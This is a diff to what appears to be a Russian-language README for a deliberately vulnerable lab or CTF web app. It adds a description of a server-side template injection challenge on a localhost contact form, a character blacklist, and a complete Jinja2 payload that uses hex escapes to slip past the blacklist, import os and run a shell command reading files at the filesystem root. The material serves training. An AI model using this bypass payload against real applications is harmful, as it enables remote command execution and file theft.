@@ -16,7 +16,11 @@
 
 SSTI:
 
-> url - http://127.0.0.1:8089/contact
+> url - http://127.0.0.1:8089/contact. Контактная форма, с одним полем ввода.
+
+> Настроил блеклист для ssti, чтоб пейлоад был поинтересней. blacklist = [".","[","]","_","join","init","flag"]
+
+> Конечный пейлоад: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cd / && cat *')|attr('read')()}}
 
 
 ### Дополнительные комментарии
